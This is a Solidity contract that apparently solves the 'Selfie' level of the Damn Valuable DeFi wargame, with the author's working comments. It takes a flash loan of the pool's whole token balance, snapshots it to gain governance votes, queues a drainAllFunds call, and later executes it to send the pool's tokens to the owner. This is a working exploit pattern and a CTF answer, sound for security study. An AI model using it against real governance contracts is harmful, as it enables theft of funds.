// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract Attacksp {
    SelfiePool immutable public pool;
    DamnValuableTokenSnapshot immutable public dvt;
    SimpleGovernance immutable public g;
    address immutable owner;
    constructor(address poolAddr, address tknAddr, address gtAddr, address ownerAddr){
        pool = SelfiePool(poolAddr);
        dvt = DamnValuableTokenSnapshot(tknAddr);
        g = SimpleGovernance(gtAddr);
        owner = ownerAddr;
    }

    event QueueAttack(uint256 indexed actionId, uint256 indexed amount);

    function queueAttack() public {
        // Queue the attack on the Governance by calling flashLoan which calls the receive Tokens to queue the attack
        uint256 balanceOfPool = dvt.balanceOf(address(pool));
        pool.flashLoan(balanceOfPool);
    }

    function receiveTokens(address /*tkn*/ ,uint256 amount)public{
        //We already intialised the tkn so i guess its not needed
        // Recieve all the token and update the snapshot
        //dvt.snapshot();

        // address of Receiver, bytes data, uint256 weiAmount
        // we should be calling the SelfiesPool's drainAllFunds(address receiver)
        // owner is essentially the attacker account's attack

        //I think we need to call snapshot to make it seem like we got all the funds 
        // When it seems like we have all the funds, it means that we have enough vote to acutally call queueAction
        dvt.snapshot();

        bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        //queueAction returns actionId which we will use to execute the fall
        // Do we need to convert the amount to wei?
        // Cause it says insufficient balance for call
        // ERC20 tokens
        uint256 actionId = g.queueAction(address(pool),payload,0);
        // transfer back all the token to the pool
        dvt.transfer(address(pool), amount);
        emit QueueAttack(actionId,amount);
    }

    function attack(uint256 actionId) public payable{
        g.executeAction(actionId);
        uint256 balanceOfContract = dvt.balanceOf(address(this));
        dvt.transfer(owner,balanceOfContract);
    }

    receive () external payable{
    }

    fallback () external payable{
    }

}
